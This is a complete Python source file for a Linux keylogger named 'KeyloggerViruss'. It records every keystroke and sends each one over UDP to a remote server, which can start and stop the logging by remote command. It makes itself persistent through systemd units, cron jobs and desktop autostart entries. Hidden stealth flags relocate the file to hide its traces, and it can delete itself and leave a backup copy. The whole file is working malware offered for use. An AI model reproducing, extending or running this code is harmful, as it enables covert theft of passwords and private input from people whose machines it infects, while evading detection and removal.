"""
@author: Vuong Van Duy
payload.py
data: 14.10.2025

This script implements a keylogger that listens for UDP commands to start and stop logging keystrokes.
When started, it captures keystrokes and sends them via UDP to a specified server.
It also ensures persistence by creating a systemd unit file to restart itself if terminated.
"""


from pynput.keyboard import Listener
import socket, json, os, sys
import argparse
from pathlib import Path
from config import special_keys, IP, BACKUP_DIR_DEFAULT
from backup import get_file_name, _md5_of_file, self_backup_and_delete
from setup_systemd import install_systemd_service, create_unit_content
from setup_cron import create_bash_content, install_cron_job
from setup_desktop_entry import install_desktop_entry, create_wrapper_script
from handshake_and_move import safe_self_relocate, is_running_in_temp_dir, run_copy_process, is_stealth_mode


class KeyloggerViruss():
    def __init__(self, host: str = "127.0.0.1", port_listen: int = 9998, port_send: int = 9999):
        self.host = host
        self.port_listen = port_listen
        self.port_send = port_send
        self.FLAG_ACTIVE = False
        self.listener = None

    def send_udp_message(self, message: str, signal: bool = True, timeout: float = 2.0):
        """
        Send a message over UDP.
        message: bytes
        host, port: destination
        timeout: timeout for socket (optional, UDP does not have ACK)
        """
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                request = {
                    "signal": signal,
                    "message": message
                }
                sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
                print(f"Sent {sent} bytes to {self.host}:{self.port_send}")
            except socket.timeout:
                pass
            except Exception as e:
                pass

    def on_press(self, key):
        try:
            if key in special_keys:
                key = special_keys[key]
            else:
                key = str(key).replace("'", "")
            self.send_udp_message(message=key)
        except AttributeError:
            pass

    def start_monitor(self):
        if self.FLAG_ACTIVE:
            return

        self.listener = Listener(on_press=self.on_press, on_release=None)
        self.listener.start()
        self.FLAG_ACTIVE = True
        print("Keyboard monitor STARTED")

    def stop_monitor(self):
        if not self.FLAG_ACTIVE:
            return
        if self.listener is not None:
            self.listener.stop()
            self.listener.join(timeout=1.0)
            self.listener = None
        self.FLAG_ACTIVE = False
        print("Keyboard monitor STOPPED")

    def run_keylogger(self, buffer_size: int = 4096):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port_listen))
        print(f"UDP server listening on {self.host}:{9998} (press Ctrl+C to stop)")

        try:
            while True:
                try:
                    data, _ = sock.recvfrom(buffer_size)
                    data = json.loads(data.decode())
                    if data.get("command", "") and not self.FLAG_ACTIVE:
                        self.start_monitor()
                    elif not data.get("command", ""):
                        self.stop_monitor()
                        message = "[KEYLOGGER STOPPED]"
                        signal = False
                        self.send_udp_message(message=message, signal=signal)
                        return
                except json.JSONDecodeError as e:
                    pass
                except OSError as e:
                    break
        except KeyboardInterrupt:
            print("\nReceived Ctrl+C — shutting down server gracefully.")
        finally:
            sock.close()
            print("Socket closed. Bye.")

def main():
    # ----- parse CLI args -----
    parser = argparse.ArgumentParser(description="Payload runner")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("--only-systemd", action="store_true", help="Install only the systemd unit (no cron, no desktop entry)")
    group.add_argument("--only-cron", action="store_true", help="Install only the cron job (no systemd, no desktop entry)")
    group.add_argument("--only-desktop", action="store_true", help="Install only the desktop entry (no systemd, no cron)")
    parser.add_argument("--no-systemd", action="store_true", help="Do not install systemd unit")
    parser.add_argument("--no-cron", action="store_true", help="Do not install cron job")
    parser.add_argument("--no-desktop", action="store_true", help="Do not install desktop entry")
    parser.add_argument("--all-enable", action="store_true", help="Install both systemd and cron and desktop entry (default)")

    parser.add_argument("--stealth", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--ready-file", type=str, help=argparse.SUPPRESS)

    args = parser.parse_args()

    # determine installation choices
    if args.only_systemd:
        do_systemd = True
        do_cron = False
        do_desktop = False
    elif args.only_cron:
        do_systemd = False
        do_cron = True
        do_desktop = False
    elif args.only_desktop:
        do_systemd = False
        do_cron = False
        do_desktop = True
    elif args.all_enable:
        do_systemd = True
        do_cron = True
        do_desktop = True
    else:
        do_systemd = False
        do_cron = False
        do_desktop = False


    # ----- prepare paths and names -----
    path_file = Path(os.path.abspath(sys.argv[0])).resolve()
    filename = get_file_name(path_file)
    filename_md5 = _md5_of_file(path_file) + '.bak'

    # 1.a. Create systemd unit to restart itself if requested
    if do_systemd:
        unit_content = create_unit_content(progFileName=filename, progFileBackup=filename_md5)
        if unit_content is None:
            print("Error creating unit content.")
            return
        if not install_systemd_service(unit_content=unit_content):
            print("Error creating systemd unit.")
            return
    else:
        print("Skipping systemd installation (user requested).")

    # 1.b. Create cron job as a backup if requested
    if do_cron:
        bash_content = create_bash_content(progFileName=filename, progFileBackup=filename_md5)
        if bash_content is None:
            print("Error creating bash content.")
            return
        if not install_cron_job(bash_content=bash_content, interval_minutes=1):
            print("Error creating cron job.")
            return
    else:
        print("Skipping cron installation (user requested).")

    # 1.c. Create desktop entry as a backup if requested
    if do_desktop:
        wrapper_path = create_wrapper_script(progFileName=filename, progFileBackup=filename_md5)
        if wrapper_path is None:
            print("Error creating wrapper script.")
            return
        if not install_desktop_entry(wrapper_path=wrapper_path):
            print("Error creating desktop entry.")
            return
    else:
        print("Skipping desktop entry installation (user requested).")

    # 2. Move the file from its original location (to DIR_SAVE_VIRUS) to hide its traces
    if not is_stealth_mode() and not is_running_in_temp_dir():
        if not safe_self_relocate(file_name=str(path_file)):
            print("Error relocating the payload.")
            return
    else:
        run_copy_process()

    # 3. Run keylogger
    keylogger = KeyloggerViruss(host=IP)
    keylogger.run_keylogger()
    print("End process keylogger. Deleting and creating backup...")

    # 4. Delete and create backup of itself
    try:
        if not self_backup_and_delete(backup_dir=BACKUP_DIR_DEFAULT, pathFileName=path_file):
            print("Error creating backup.")
            return
    except PermissionError:
        print("Error: No write access")
        return


if __name__ == "__main__":
    main()